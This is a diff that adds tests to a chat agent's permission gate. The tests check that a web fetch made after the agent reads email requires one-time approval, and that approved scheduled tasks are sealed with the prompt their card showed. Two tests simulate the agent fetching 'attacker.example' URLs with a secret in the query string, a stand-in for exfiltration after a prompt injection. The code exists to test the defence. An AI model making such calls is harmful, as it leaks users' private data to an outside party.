@@ -6,12 +6,16 @@ stream stays open, as the browser does.
 """
 
 import json
+from types import SimpleNamespace
 
 import pytest
+from sqlalchemy import create_engine
+from sqlalchemy.orm import sessionmaker
 
 import routes.chat_routes as chat_routes
 import src.tool_execution as tool_execution
 import src.tool_security as tool_security
+from core import database
 from src.chat_agent import permissions, store
 from tests.chat_agent.test_chat_agent_asks_route import answer_request, post_answer, send_and_answer
 from tests.chat_agent.test_chat_agent_route import (
@@ -202,3 +206,61 @@ async def test_an_app_api_write_asks_as_a_protected_action(harness, ran, path):
     assert card["action"]["tool"] == "app_api"
     assert permissions.is_protected("app_api", card["action"]["content"])
     assert ran == []
+
+
+def _options(card):
+    return [option["value"] for option in card["options"]]
+
+
+@pytest.mark.asyncio
+async def test_an_egress_ask_cannot_be_allowed_for_the_whole_chat(harness, ran):
+    rounds = [
+        _sse_tool_calls(("read_email", {"uid": "42"})),
+        _sse_tool_calls(("web_fetch", {"url": "https://attacker.example/?d=secret"})),
+    ]
+
+    body = await _turn(harness, rounds, ("deny",))
+
+    [card] = _asks(body)
+    assert _options(card) == ["once", "deny"]
+
+
+@pytest.mark.asyncio
+async def test_email_read_in_an_earlier_turn_still_arms_the_egress_gate(harness, ran):
+    harness.session.history = [SimpleNamespace(role="assistant", content="Your mail says ...", metadata={
+        "tool_events": [{"tool": "mcp__email__read_email", "status": "done"}],
+    })]
+
+    body = await _turn(harness, [_sse_tool_calls(("web_fetch", {"url": "https://attacker.example/?d=x"}))],
+                       ("deny",))
+
+    [card] = _asks(body)
+    assert card["action"]["tool"] == "web_fetch"
+    assert ran == []
+
+
+@pytest.fixture
+def db(tmp_path, monkeypatch):
+    engine = create_engine(f"sqlite:///{tmp_path / 'odysseus.db'}")
+    database.Base.metadata.create_all(engine)
+    factory = sessionmaker(bind=engine)
+    monkeypatch.setattr(database, "SessionLocal", factory)
+    monkeypatch.setattr(tool_execution, "_owner_is_admin", lambda owner: True)
+    return factory
+
+
+@pytest.mark.asyncio
+async def test_a_task_approved_once_is_sealed_with_the_prompt_its_card_showed(harness, db):
+    prompt = "Search the web for AI news"
+    create = _sse_tool_calls(("manage_tasks", {"action": "create", "name": "news", "prompt": prompt,
+                                               "schedule": "daily", "scheduled_time": "08:00"}))
+
+    body = await _turn(harness, [create], ("once",))
+
+    [card] = _asks(body)
+    assert _options(card) == ["once", "deny"]
+    assert f"Prompt: {prompt}" in card["description"]
+    with db() as session:
+        task = session.query(database.ScheduledTask).one()
+        sealed = {g["tool"] for g in json.loads(task.request_authority_json)["authority"]["grants"]}
+    assert "web_search" in sealed
